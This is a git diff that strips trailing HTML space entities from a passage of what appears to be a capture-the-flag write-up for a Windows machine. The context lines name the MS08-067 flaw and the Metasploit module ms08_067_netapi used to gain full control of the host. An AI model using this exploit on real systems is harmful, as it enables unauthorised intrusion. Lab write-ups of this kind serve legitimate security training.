@@ -65,7 +65,7 @@ We
 Nmap done: 1 IP address (1 host up) scanned in 5.34 seconds
 ```
 
-So this was vulnerable to MS08-067. We can use `msfconsole` to exploit this.&#x20;
+So this was vulnerable to MS08-067. We can use `msfconsole` to exploit this.
 
 ```
 use exploit/windows/smb/ms08_067_netapi
@@ -82,4 +82,4 @@ For some reason, `whoami` does not work on the machine. We can use the `whoami.e
 
 <figure><img src="../../../.gitbook/assets/image (658).png" alt=""><figcaption></figcaption></figure>
 
-Rooted!&#x20;
+Rooted!
